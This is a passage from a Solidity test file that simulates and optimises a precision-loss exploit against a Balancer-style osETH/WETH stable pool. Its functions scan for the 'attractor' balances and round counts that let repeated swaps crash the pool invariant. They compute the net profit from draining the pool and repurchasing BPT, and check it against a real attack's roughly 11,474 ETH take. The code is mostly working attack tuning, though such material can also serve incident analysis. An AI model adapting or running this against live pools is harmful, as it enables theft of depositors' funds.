        return tokensExtracted + cyclingGain - repaymentCost;
    }

    function test_searchRemainBalance() public {
        // Derive trickAmt analytically
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== SEARCH: targetRemainBalance by NET PROFIT ===");
        console.log("trickAmt derived:", trickAmt);

        // Fetch real pool balances to compute full profit
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];   // index 0 = WETH
        uint256 realOSETH = realBal[2];  // index 2 = osETH
        uint256 totalBPT = OSETH_BPT.getActualSupply();
        uint256 realD = _getInvariant(realWETH, realOSETH);
        console.log("Real pool WETH:", realWETH);
        console.log("Real pool osETH:", realOSETH);
        console.log("Real D:", realD);
        console.log("BPT actual supply:", totalBPT);

        uint256 testRounds = 40;

        // Phase 1: Coarse scan (step=1000) to find infinite attractors
        // Break early when D converges (stops changing between rounds)
        uint256 attractorCount = 0;
        uint256[100] memory attractorRemain;
        uint256[100] memory attractorDafter;
        uint256[100] memory attractorWafter;
        uint256[100] memory attractorOafter;
        uint256[100] memory attractorBandWidth;
        uint256[100] memory attractorConvergeRound;

        for (uint256 remain = 10000; remain <= 100000; remain += 1000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 convergedAt = 0;
            // D drop threshold: 98% of initial D consumed → remaining D <= 2% of initial
            // (empirically D stabilizes around ~1.8% of initial, never reaching 1%)
            uint256 dThreshold = initialD * 2 / 100;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    uint256 curD = _getInvariant(bW, bO);
                    if (curD <= dThreshold && convergedAt == 0) {
                        convergedAt = r + 1; // D dropped 99%+ at this round
                        break;
                    }
                } catch { break; }
            }
            // convergedAt > 0 means D dropped 99%+ (attractor found)
            if (convergedAt > 0 || ok >= testRounds) {
                attractorRemain[attractorCount] = remain;
                attractorDafter[attractorCount] = _getInvariant(bW, bO);
                attractorWafter[attractorCount] = bW;
                attractorOafter[attractorCount] = bO;
                attractorConvergeRound[attractorCount] = convergedAt > 0 ? convergedAt : ok;
                attractorCount++;
            }
        }

        console.log("attractorCount:", attractorCount);

        // Phase 2: For each attractor, compute profit and band width
        console.log("--- Per-attractor profit analysis ---");
        uint256 bestProfit = 0;
        uint256 bestRemain = 0;
        uint256 bestBandWidth = 0;

        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 remain = attractorRemain[a];
            uint256 dAfter = attractorDafter[a];
            uint256 wAfter = attractorWafter[a];
            uint256 oAfter = attractorOafter[a];

            // --- Profit computation (high-fidelity simulation) ---
            uint256 profitWETH = _computeProfit(remain, wAfter, oAfter, realWETH, realOSETH, totalBPT);

            // --- Band width (with D drop 99% early break) ---
            uint256 bandStart = 0; uint256 bandEnd = 0;
            for (uint256 r2 = remain > 5000 ? remain - 5000 : 1000; r2 <= remain + 5000; r2 += 100) {
                uint256 bW = r2; uint256 bO = r2; uint256 ok2 = 0;
                uint256 initD2 = _getInvariant(bW, bO);
                uint256 dThresh2 = initD2 * 2 / 100;
                bool converged2 = false;
                for (uint256 r = 0; r < testRounds; r++) {
                    if (bO <= trickAmt + 1) break;
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                        bW = w; bO = o; ok2++;
                        uint256 curD2 = _getInvariant(bW, bO);
                        if (curD2 <= dThresh2) { converged2 = true; break; }
                    } catch { break; }
                }
                if (converged2 || ok2 >= testRounds) {
                    if (bandStart == 0) bandStart = r2;
                    bandEnd = r2;
                }
            }
            uint256 bandWidth = bandEnd >= bandStart ? bandEnd - bandStart : 0;

            attractorBandWidth[a] = bandWidth;

            console.log("remain:", remain, "D_after:", dAfter);
            console.log("  convergedAt:", attractorConvergeRound[a]);
            console.log("  profitWETH:", profitWETH, "bandWidth:", bandWidth);

            // Track best profit for threshold calculation
            if (profitWETH > bestProfit) {
                bestProfit = profitWETH;
            }
        }

        // Phase 3: Among attractors within 1% of max profit AND with sufficient band width,
        // pick the highest remain value.
        // Rationale: profit is essentially constant (~0.5% variation across all attractors),
        // so the real differentiator is robustness (band width) and practicality (high remain
        // = less draining in Step 1 = lower gas).
        // Minimum band width = 50% of the widest band found (filters out fragile outliers
        // like 94000 with bandWidth=1400 vs typical 5700-10000)
        uint256 profitThreshold = bestProfit * 99 / 100;
        uint256 maxBW = 0;
        for (uint256 a = 0; a < attractorCount; a++) {
            if (attractorBandWidth[a] > maxBW) maxBW = attractorBandWidth[a];
        }
        uint256 minBandWidth = maxBW / 2;  // require at least 50% of widest band
        bestRemain = 0;

        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 remain = attractorRemain[a];
            uint256 dAfter = attractorDafter[a];
            uint256 wAfter = attractorWafter[a];
            uint256 oAfter = attractorOafter[a];

            uint256 profitWETH = _computeProfit(remain, wAfter, oAfter, realWETH, realOSETH, totalBPT);

            if (profitWETH >= profitThreshold && attractorBandWidth[a] >= minBandWidth && remain > bestRemain) {
                bestRemain = remain;
            }
        }

        console.log("=== BEST RESULT ===");
        console.log("Best targetRemainBalance:", bestRemain);
        console.log("Max profit (WETH wei):", bestProfit);
        console.log("Min band width required:", minBandWidth);

        // Print convergence rounds for all attractors with max profit (within 1%)
        console.log("--- Convergence rounds for top-profit attractors ---");
        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 remain = attractorRemain[a];
            uint256 wAfter = attractorWafter[a];
            uint256 oAfter = attractorOafter[a];
            uint256 profitWETH = _computeProfit(remain, wAfter, oAfter, realWETH, realOSETH, totalBPT);
            if (profitWETH >= profitThreshold) {
                console.log("  remain:", remain, "convergedAt:", attractorConvergeRound[a]);
                console.log("    profit:", profitWETH);
            }
        }
    }

    /// @notice Find optimal N for the best attractor discovered by test_searchRemainBalance.
    /// Uses the same profit-based selection, then finds N where marginal profit per round
    /// drops below threshold (gas cost exceeds marginal gain).
    function test_findOptimalN() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== FIND OPTIMAL N (profit-based, no hardcoded values) ===");

        // Fetch real pool state
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();
        uint256 realD = _getInvariant(realWETH, realOSETH);

        // Re-discover the best attractor (same profit + band width logic as test_searchRemainBalance)
        uint256 testRounds = 40;
        uint256 bestRemain = _findBestRemain(trickAmt, testRounds, realWETH, realOSETH, totalBPT, realD);
        console.log("Discovered bestRemain:", bestRemain);

        // Now find optimal N: run rounds and track cumulative profit growth
        uint256 maxRounds = 60;
        uint256 balWETH = bestRemain;
        uint256 balOSETH = bestRemain;
        uint256 dInitial = _getInvariant(balWETH, balOSETH);
        uint256 dPrev = dInitial;
        uint256 optimalN = 0;

        for (uint256 r = 0; r < maxRounds; r++) {
            if (balOSETH <= trickAmt + 1) break;
            try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                balWETH = w; balOSETH = o;
                uint256 dNow = _getInvariant(balWETH, balOSETH);
                uint256 marginal = dPrev > dNow ? dPrev - dNow : 0;
                console.log("Round:", r, "D:", dNow);
                console.log("  marginalD:", marginal);
                // Mark the first round where marginal D-deflation < 0.01% of D_initial
                if (marginal * 10000 < dInitial && optimalN == 0) {
                    optimalN = r;
                }
                dPrev = dNow;
            } catch {
                console.log("Round:", r, "REVERTED");
                break;
            }
        }

        uint256 dFinal = _getInvariant(balWETH, balOSETH);
        uint256 deflBps = (dInitial - dFinal) * 10000 / dInitial;

        console.log("=== RESULT ===");
        console.log("Discovered remain:", bestRemain);
        console.log("Optimal N:", optimalN);
        console.log("D_initial:", dInitial, "D_final:", dFinal);
        console.log("Total D-deflation (bps):", deflBps);
    }


    /// @notice Validate that remain=67000, N=30 produces the correct profit.
    /// Uses high-fidelity simulation for both Step 1 (geometric decay GIVEN_OUT exits)
    /// and Step 3 (geometric series BPT buyback with D recovery).
    function test_validateProfit() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== VALIDATE PROFIT: remain=67000, N=30 ===");

        // Fetch real pool state
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        // Use getActualSupply() which equals virtualSupply + protocolFeeAmount,
        // matching the real pool's preJoinExitSupply after _payProtocolFeesBeforeJoinExit
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        console.log("Real WETH:", realWETH);
        console.log("Real osETH:", realOSETH);
        console.log("BPT supply (actualSupply):", totalBPT);

        uint256 remain = 67000;
        uint256 N = 30;

        // Step 1: simulate sequential GIVEN_OUT BPT→token exits with geometric decay
        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Inv) =
            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
        console.log("--- Step 1 (simulated) ---");
        console.log("Tokens extracted:", tokensExtracted);
        console.log("BPT sold:", bptSold);
        console.log("Post-Step1 virtualSupply:", postStep1Supply);
        console.log("Phase1 lastPostJoinExitInvariant:", phase1Inv);

        // Step 2: cycle N rounds, track exact balances
        // Token↔token swaps do NOT update _lastPostJoinExitInvariant in the real contract
        uint256 balWETH = remain;
        uint256 balOSETH = remain;
        uint256 dBefore = _getInvariant(balWETH, balOSETH);
        console.log("--- Step 2 ---");
        console.log("D before cycling:", dBefore);

        for (uint256 r = 0; r < N; r++) {
            (balWETH, balOSETH) = this.simulateOneRound(balWETH, balOSETH, trickAmt);
        }
        uint256 dAfter = _getInvariant(balWETH, balOSETH);
        console.log("D after cycling:", dAfter);
        console.log("bal after cycling: WETH=", balWETH, "osETH=", balOSETH);

        // Pool lost (2*remain - sumAfter) tokens during cycling → attacker gained them
        uint256 cyclingGain = 2 * remain - (balWETH + balOSETH);
        console.log("Cycling gain (tokens extracted from pool by D-crash):", cyclingGain);

        // Step 3: simulate buying back BPT with dynamic D recovery
        // Phase 3 reads _lastPostJoinExitInvariant from Phase 1 (Phase 2 didn't update it)
        uint256 bptTarget = totalBPT * 10030 / 10000;
        console.log("--- Step 3 ---");
        console.log("bptTarget:", bptTarget);
        uint256 repaymentCost = _simulateStep3RepaymentDebug(balWETH, balOSETH, bptTarget, postStep1Supply, phase1Inv);
        console.log("Repayment cost (tokens to buy back BPT):", repaymentCost);

        // Net profit = tokens left over
        uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
        console.log("=== NET PROFIT ===");
        console.log("Profit (token wei):", profit);
        console.log("Profit (ETH):", profit / 1e18);

        // Compare with real attack Pool 1 (osETH/WETH) net deltas
        // Real tx: Pool 1 net: WETH=4623.60, osETH=6851.12, BPT=44.15 => ~11474 ETH
        uint256 realPool1Profit = 11474;
        console.log("--- Real attack Pool 1 profit ~= 11474 ETH ---");
        if (profit / 1e18 >= realPool1Profit) {
            console.log("Formula error (%):", (profit / 1e18 - realPool1Profit) * 100 / realPool1Profit);
        } else {
            console.log("Formula error (%):", (realPool1Profit - profit / 1e18) * 100 / realPool1Profit);
            console.log("(underestimate)");
        }
    }

    /// @notice Fine-grained search around attractor clusters to measure band width
    function test_attractorBandWidth() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        console.log("=== ATTRACTOR BAND WIDTH (step=100) ===");
        uint256 testRounds = 40;

        // Scan around the two candidate clusters
        uint256[2] memory centers = [uint256(67000), uint256(94000)];

        for (uint256 c = 0; c < 2; c++) {
            uint256 center = centers[c];
            uint256 bandStart = 0;
            uint256 bandEnd = 0;
            console.log("--- Cluster around:", center, "---");

            for (uint256 remain = center - 5000; remain <= center + 5000; remain += 100) {
                uint256 balWETH = remain;
                uint256 balOSETH = remain;
                uint256 roundsOk = 0;

                for (uint256 r = 0; r < testRounds; r++) {
                    if (balOSETH <= trickAmt + 1) break;
                    try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                        balWETH = w;
                        balOSETH = o;
                        roundsOk++;
                    } catch { break; }
                }

                if (roundsOk >= testRounds) {
                    if (bandStart == 0) bandStart = remain;
                    bandEnd = remain;
                }
            }

            console.log("Band start:", bandStart, "end:", bandEnd);
            if (bandEnd >= bandStart) {
                console.log("Band width:", bandEnd - bandStart);
            }
        }
    }

    /// @notice Shared helper: find best remain using profit + band width logic.
    /// Among attractors within 1% of max profit AND with bandWidth >= 50% of max,
    /// pick the highest remain (= least Step 1 cost).
    function _findBestRemain(
        uint256 trickAmt,
        uint256 testRounds,
        uint256 realWETH,
        uint256 realOSETH,
        uint256 totalBPT,
        uint256 realD
    ) internal returns (uint256 bestRemain) {
        uint256 attractorCount = 0;
        uint256[50] memory aRemain;
        uint256[50] memory aDafter;
        uint256[50] memory aWafter;
        uint256[50] memory aOafter;
        uint256[50] memory aBandWidth;

        // Coarse scan
        for (uint256 remain = 10000; remain <= 100000; remain += 1000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                } catch { break; }
            }
            if (ok >= testRounds) {
                aRemain[attractorCount] = remain;
                aDafter[attractorCount] = _getInvariant(bW, bO);
                aWafter[attractorCount] = bW;
                aOafter[attractorCount] = bO;
                attractorCount++;
            }
        }

        // Fine scan for band width + compute profit
        uint256 bestProfit = 0;
        uint256 maxBW = 0;
        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 center = aRemain[a];
            uint256 bandStart = 0; uint256 bandEnd = 0;
            for (uint256 r2 = center > 5000 ? center - 5000 : 1000; r2 <= center + 5000; r2 += 100) {
                uint256 bW = r2; uint256 bO = r2; uint256 ok = 0;
                for (uint256 r = 0; r < testRounds; r++) {
                    if (bO <= trickAmt + 1) break;
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                        bW = w; bO = o; ok++;
                    } catch { break; }
                }
                if (ok >= testRounds) {
                    if (bandStart == 0) bandStart = r2;
                    bandEnd = r2;
                }
            }
            aBandWidth[a] = bandEnd >= bandStart ? bandEnd - bandStart : 0;
            if (aBandWidth[a] > maxBW) maxBW = aBandWidth[a];

            // Compute profit (high-fidelity simulation)
            uint256 profit = _computeProfit(aRemain[a], aWafter[a], aOafter[a], realWETH, realOSETH, totalBPT);
            if (profit > bestProfit) bestProfit = profit;
        }

        // Select: within 1% of max profit, bandWidth >= 50% of max, highest remain
        uint256 profitThreshold = bestProfit * 99 / 100;
        uint256 minBW = maxBW / 2;
        for (uint256 a = 0; a < attractorCount; a++) {
            uint256 profit = _computeProfit(aRemain[a], aWafter[a], aOafter[a], realWETH, realOSETH, totalBPT);
            if (profit >= profitThreshold && aBandWidth[a] >= minBW && aRemain[a] > bestRemain) {
                bestRemain = aRemain[a];
            }
        }
    }

    /// @notice Like simulateOneRound but returns intermediate WETH balance and swap3 amount
    function simulateOneRoundDetailed(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 wethAfterSwap12, uint256 swap3Amount) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);

        // Swap 1: drain osETH to trickAmt + 1
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = bal[1] - trickAmt - 1;
        bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        wethAfterSwap12 = bal[0];

        // Swap 3: binary search for maximum extractable WETH
        (swap3Amount, bal[0], bal[1]) = this._computeSwap3(bal[0], bal[1]);

        return (bal[0], bal[1], wethAfterSwap12, swap3Amount);
    }

    /// @notice Test how many cycling rounds remain=67000 can sustain under gas constraint.
    function test_maxRoundsAt67000() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        uint256 balWETH = 67000;
        uint256 balOSETH = 67000;

        console.log("=== MAX ROUNDS TEST: remain=67000 ===");
        console.log("trickAmt:", trickAmt);
        console.log("Initial gasleft:", gasleft());

        // Track gas per round dynamically
        uint256 lastRoundGas = 0;
        uint256 reserveGas = 100_000;
        uint256 roundCount = 0;

        while (true) {
            // Use last round's gas cost (or a safe initial estimate) to check budget
            uint256 needed = (lastRoundGas > 0 ? lastRoundGas : 500_000) + reserveGas;
            if (gasleft() < needed) {
                console.log("Gas exhausted after rounds:", roundCount);
                console.log("  gasleft:", gasleft());
                break;
            }
            if (balOSETH <= trickAmt + 1) {
                console.log("Stopped: balOSETH too small at round", roundCount);
                break;
            }
            uint256 gasBefore = gasleft();
            try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                balWETH = w;
                balOSETH = o;
                lastRoundGas = gasBefore - gasleft();
                roundCount++;
            } catch {
                console.log("REVERTED at round:", roundCount);
                break;
            }
        }

        uint256 dFinal = _getInvariant(balWETH, balOSETH);
        console.log("Total rounds completed:", roundCount);
        console.log("Final WETH:", balWETH, "osETH:", balOSETH);
        console.log("Final D:", dFinal);
    }

    /// @notice Compare remain=67000 vs remain=94000 end-to-end
    function test_compareRemains() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();
        uint256 N = 30;

        uint256[2] memory remains = [uint256(67000), uint256(94000)];
        for (uint256 idx = 0; idx < 2; idx++) {
            _compareRemainsOnePass(remains[idx], trickAmt, N, realWETH, realOSETH, totalBPT);
        }
    }

    function _compareRemainsOnePass(
        uint256 remain, uint256 trickAmt, uint256 N,
        uint256 realWETH, uint256 realOSETH, uint256 totalBPT
    ) internal {
        console.log("========== remain =", remain, "==========");

        // Step 1
        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Inv) =
            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
        console.log("Step1 tokensExtracted:", tokensExtracted);
        console.log("Step1 bptSold:", bptSold);
        console.log("Step1 postSupply:", postStep1Supply);

        // Step 2 — token↔token swaps don't update _lastPostJoinExitInvariant
        uint256 bW = remain; uint256 bO = remain;
        uint256 dBefore = _getInvariant(bW, bO);
        for (uint256 r = 0; r < N; r++) {
            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
        }
        uint256 dAfter = _getInvariant(bW, bO);
        console.log("Step2 D_before:", dBefore, "D_after:", dAfter);
        console.log("Step2 balW:", bW, "balO:", bO);
        console.log("Step2 D_deflation_bps:", (dBefore - dAfter) * 10000 / dBefore);
        uint256 cyclingGain = 2 * remain - (bW + bO);
        console.log("Step2 cyclingGain:", cyclingGain);

        // Step 3 — uses Phase 1's lastPostJoinExitInvariant
        uint256 bptTarget = totalBPT * 10030 / 10000;
        console.log("Step3 bptTarget:", bptTarget);
        console.log("Step3 postStep1Supply:", postStep1Supply);
        uint256 repaymentCost = _simulateStep3RepaymentDebug(bW, bO, bptTarget, postStep1Supply, phase1Inv);
        console.log("Step3 repaymentCost:", repaymentCost);

        // Profit
        uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
        console.log("NET PROFIT (wei):", profit);
        console.log("NET PROFIT (ETH):", profit / 1e18);
        console.log("");
    }


    /// @notice Lightweight landscape scan: which remain values are attractors?
    /// Simulates coarse search strategies an attacker might use.
    function test_profitLandscape() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        console.log("=== PROFIT LANDSCAPE SCAN ===");
        console.log("trickAmt:", trickAmt);

        uint256 testRounds = 40;

        // Scan step=5000 (what a quick first scan would look like)
        console.log("--- Step=5000 scan ---");
        for (uint256 remain = 5000; remain <= 200000; remain += 5000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 dThreshold = initialD * 2 / 100;
            bool converged = false;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    if (_getInvariant(bW, bO) <= dThreshold) { converged = true; break; }
                } catch { break; }
            }
            if (converged || ok >= testRounds) {
                console.log("  remain:", remain, "rounds:", converged ? ok + 1 : ok);
                console.log("    D_final:", _getInvariant(bW, bO));
            }
        }

        // Scan step=10000 (coarsest practical scan)
        console.log("--- Step=10000 scan ---");
        for (uint256 remain = 10000; remain <= 200000; remain += 10000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 dThreshold = initialD * 2 / 100;
            bool converged = false;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    if (_getInvariant(bW, bO) <= dThreshold) { converged = true; break; }
                } catch { break; }
            }
            if (converged || ok >= testRounds) {
                console.log("  remain:", remain, "rounds:", converged ? ok + 1 : ok);
                console.log("    D_final:", _getInvariant(bW, bO));
            }
        }

        // Scan step=1000 (fine scan) - just list attractors
        console.log("--- Step=1000 scan (attractors only) ---");
        uint256 prevAttractor = 0;
        uint256 clusterStart = 0;
        uint256 clusterEnd = 0;
        uint256 clusterCount = 0;

        for (uint256 remain = 1000; remain <= 200000; remain += 1000) {
            uint256 bW = remain; uint256 bO = remain; uint256 ok = 0;
            uint256 initialD = _getInvariant(bW, bO);
            uint256 dThreshold = initialD * 2 / 100;
            bool converged = false;
            for (uint256 r = 0; r < testRounds; r++) {
                if (bO <= trickAmt + 1) break;
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 w, uint256 o) {
                    bW = w; bO = o; ok++;
                    if (_getInvariant(bW, bO) <= dThreshold) { converged = true; break; }
                } catch { break; }
            }
            bool isAttractor = converged || ok >= testRounds;

            if (isAttractor) {
                if (clusterStart == 0 || remain - prevAttractor > 1000) {
                    // New cluster
                    if (clusterStart > 0) {
                        console.log("  Cluster:", clusterCount, "start:", clusterStart);
                        console.log("    end:", clusterEnd);
                    }
                    clusterCount++;
                    clusterStart = remain;
                }
                clusterEnd = remain;
                prevAttractor = remain;
            }
        }
        if (clusterStart > 0) {
            console.log("  Cluster:", clusterCount, "start:", clusterStart);
            console.log("    end:", clusterEnd);
        }
        console.log("Total attractor clusters:", clusterCount);
    }

    /// @notice Debug: observe D changes per round for remain=67000
    function test_debugDConvergence67000() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        uint256 balWETH = 67000;
        uint256 balOSETH = 67000;
        uint256 prevD = _getInvariant(balWETH, balOSETH);

        console.log("=== D CONVERGENCE DEBUG: remain=67000 ===");
        console.log("Round 0: D =", prevD);

        for (uint256 r = 0; r < 50; r++) {
            try this.simulateOneRound(balWETH, balOSETH, trickAmt) returns (uint256 w, uint256 o) {
                balWETH = w; balOSETH = o;
                uint256 curD = _getInvariant(balWETH, balOSETH);
                uint256 diff = prevD > curD ? prevD - curD : curD - prevD;
                console.log("Round:", r + 1, "D:", curD);
                console.log("  diff:", diff);
                prevD = curD;
            } catch {
                console.log("REVERTED at round:", r + 1);
                break;
            }
        }
    }

    // ─── Detailed per-token breakdown ───────────────────────────────────

    /// @notice Single-step helper to avoid stack-too-deep in the extraction loop.
    /// Computes BPT burned, protocol fee minted, and returns updated (newBal, newSupply, bptIn).
    /// tokenIndex: 0 = WETH, 1 = osETH. newBal is the post-exit balance of the exited token.
    function _doSingleExitStep(
        uint256 bW,
        uint256 bO,
        uint256 supply,
        uint256 tokenIndex,
        uint256 tokenOut,
        uint256 preInvariant
    ) internal view returns (uint256 newBal, uint256 newSupply, uint256 bptIn, uint256 postInv) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = bW; bal[1] = bO;
        scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
        bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, tokenIndex, tokenOut, supply, amp, swapFeePercentage);
        postInv = _calcPostInvariant(bW, bO, tokenIndex, tokenOut, false);
        uint256 postBW = tokenIndex == 0 ? bW - tokenOut : bW;
        uint256 postBO = tokenIndex == 1 ? bO - tokenOut : bO;
        uint256 postSupply = supply - bptIn;
        uint256 feeBpt = _calcProtocolFeeBpt(preInvariant, supply, postInv, postSupply);
        newBal = tokenIndex == 0 ? postBW : postBO;
        newSupply = postSupply + feeBpt;
    }

    function _simulateStep1ExtractionDetailed(
        uint256 realWETH,
        uint256 realOSETH,
        uint256 targetRemain,
        uint256 bptSupply
    ) internal returns (uint256 totalWethOut, uint256 totalOsethOut, uint256 totalBptSold, uint256 remainingSupply, uint256 lastPostJoinExitInvariant) {
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);

        uint256 bW = realWETH;
        uint256 bO = realOSETH;
        uint256 supply = bptSupply;

        // Use fresh invariant from current balances for all steps (matches _simulateStep1Extraction).

        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                uint256 preInv = _getInvariant(bW, bO);
                uint256 bptIn;
                uint256 postInv;
                (bW, supply, bptIn, postInv) = _doSingleExitStep(bW, bO, supply, 0, wethAmounts[i], preInv);
                totalBptSold += bptIn;
                totalWethOut += wethAmounts[i];
                lastPostJoinExitInvariant = postInv;
                console.log("[SP1] step", i, "WETH supply_after:", supply);
            }
            if (i < osethCount) {
                uint256 preInv = _getInvariant(bW, bO);
                uint256 bptIn;
                uint256 postInv;
                (bO, supply, bptIn, postInv) = _doSingleExitStep(bW, bO, supply, 1, osethAmounts[i], preInv);
                totalBptSold += bptIn;
                totalOsethOut += osethAmounts[i];
                lastPostJoinExitInvariant = postInv;
                console.log("[SP1] step", i, "OSETH supply_after:", supply);
            }
        }
        remainingSupply = supply;
    }

    /// @notice Debug version with per-step logging matching EXP output format
    function _simulateStep3RepaymentDetailedWithLog(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;

        console.log("[SP] Phase3 step count:", swapCount);
        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            totalBptBought += bptAmounts[i];
            uint256 preInvariant = _getInvariant(bW, bO);
            // Between-swap fee
            uint256 beforeFee = _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
            supply += beforeFee;
            uint256 preSupply = supply;
            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW; bal[1] = bO;
            scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
            console.log("[SP] Phase3 step", i, "BPT amount:", bptAmounts[i]);
            console.log("[SP]   assetIn:", tokenIndex == 0 ? 0 : 2);
            console.log("[SP]   tokenIn:", amountIn);
            console.log("[SP]   supply:", supply);
            if (beforeFee > 0) {
                console.log("[SP]   beforeSwapFeeBpt:", beforeFee);
            }
            if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
            else { bO += amountIn; osethCost += amountIn; }
            supply += bptAmounts[i];
            uint256 feeBpt = _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            supply += feeBpt;
            console.log("[SP]   supply after:", supply);
            console.log("[SP]   feeBpt:", feeBpt);
            console.log("[SP]   preInv:", preInvariant, "postInv:", postInv);
            storedInvariant = postInv;
        }
    }

    function _simulateStep3RepaymentDetailed(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal view returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;

        uint256 storedInvariant = initialStoredInvariant;
